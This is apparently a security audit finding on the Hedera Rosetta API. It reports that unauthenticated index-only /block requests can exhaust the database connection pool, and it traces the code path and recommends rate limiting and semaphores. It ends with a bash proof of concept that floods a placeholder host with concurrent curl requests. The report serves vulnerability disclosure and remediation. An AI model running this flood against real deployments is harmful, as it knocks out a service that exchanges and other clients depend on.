### Title
Unauthenticated DB Connection Pool Exhaustion via Index-Only `/block` Requests

### Summary
The `Block()` handler in `rosetta/app/services/block_service.go` accepts unauthenticated POST requests. When a `PartialBlockIdentifier` carries only an `Index` (Hash nil), `RetrieveBlock()` unconditionally dispatches to `FindByIndex()`, which executes multiple raw SQL queries against the database. There is no application-level rate limiting or concurrency control, so an attacker flooding concurrent Index-only requests can exhaust the DB connection pool (default: 100 open connections), rendering the Rosetta API service completely unresponsive.

### Finding Description

**Exact code path:**

`Block()` (`block_service.go:51`) → `RetrieveBlock()` (`base_service.go:82–83`) → `FindByIndex()` (`block.go:171–181`) → `findBlockByIndex()` (`block.go:210–223`)

```
// base_service.go:82-83
} else if bIdentifier.Hash == nil && bIdentifier.Index != nil {
    return b.blockRepo.FindByIndex(ctx, *bIdentifier.Index)
```

`FindByIndex()` only rejects `index < 0`; any non-negative index passes through to `findBlockByIndex()`, which acquires a DB connection and executes `selectRecordBlockByIndex` (a correlated subquery):

```sql
select consensus_start,
       coalesce((select consensus_start-1 from record_file where index = @index + 1::bigint), consensus_end) as consensus_end,
       hash, index, prev_hash
from record_file where index = @index
```

If the block is found, `Block()` then calls `FindBetween()` (a second DB query for all transactions in the block) and `updateOperationAccountAlias()`, which loops over every operation in every transaction and issues a `GetAccountAlias()` DB query for each account not in the LRU cache. A single request against a busy block can therefore hold multiple DB connections for the full duration of the statement timeout (default 20 s).

**Root cause / failed assumption:** The application assumes an external layer (Traefik) enforces concurrency limits. The Traefik middleware is declared in `charts/hedera-mirror-rosetta/templates/middleware.yaml` behind a conditional `{{ if and .Values.global.middleware .Values.middleware }}` — it is opt-in and absent in bare/non-Kubernetes deployments. Even when present, the `inFlightReq: amount: 5` limit is per source IP, trivially bypassed with multiple IPs or a botnet.

**DB pool ceiling:** `rosetta/app/db/db.go:33` sets `sqlDb.SetMaxOpenConns(dbConfig.Pool.MaxOpenConnections)` — default 100. Once all 100 connections are held by attacker goroutines, every legitimate request blocks waiting for a connection until the 20-second statement timeout fires, causing cascading latency and eventual service failure.

### Impact Explanation

The Rosetta API service becomes fully unresponsive to all clients (block explorers, exchange integrations, Coinbase Rosetta validators). The underlying Hedera network continues to confirm transactions, so this is not a literal "total network shutdown," but it is a complete denial-of-service of the Rosetta API layer. Any system depending on the Rosetta interface for transaction submission or balance queries is unable to operate for the duration of the attack.

### Likelihood Explanation

No credentials, API keys, or special network position are required. The attack payload is a trivial HTTP POST:

```json
POST /block
{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
 "block_identifier":{"index":1}}
```

A single attacker machine can open hundreds of concurrent TCP connections. The 20-second statement timeout means each connection holds a DB slot for up to 20 seconds, so only ~5 requests/second per connection are needed to keep the pool saturated. This is well within the capability of any commodity server or even a modest VPS.

### Recommendation

1. **Application-level concurrency semaphore:** Add a `golang.org/x/sync/semaphore` (or `chan struct{}`) in `blockAPIService` to cap concurrent in-flight DB-touching requests (e.g., 50), returning HTTP 429 when the limit is reached.
2. **Per-IP rate limiting in the application:** Use a middleware such as `golang.org/x/time/rate` keyed on the client IP before the request reaches any service handler.
3. **Do not rely solely on infrastructure middleware:** The Traefik middleware is conditional and absent in non-Kubernetes deployments. Defensive controls must exist at the application layer.
4. **Reduce per-request DB query fan-out:** Batch the `GetAccountAlias()` calls in `updateOperationAccountAlias()` into a single query instead of one query per operation, reducing the number of connections held per request.

### Proof of Concept

```bash
# Exhaust the DB connection pool with 120 concurrent Index-only /block requests
for i in $(seq 1 120); do
  curl -s -X POST http://<rosetta-host>:5700/block \
    -H 'Content-Type: application/json' \
    -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
         "block_identifier":{"index":1}}' &
done
wait

# Verify: legitimate requests now time out or return 500/503
curl -X POST http://<rosetta-host>:5700/block \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
       "block_identifier":{"index":2}}'
# Expected: connection hang or database error response
```
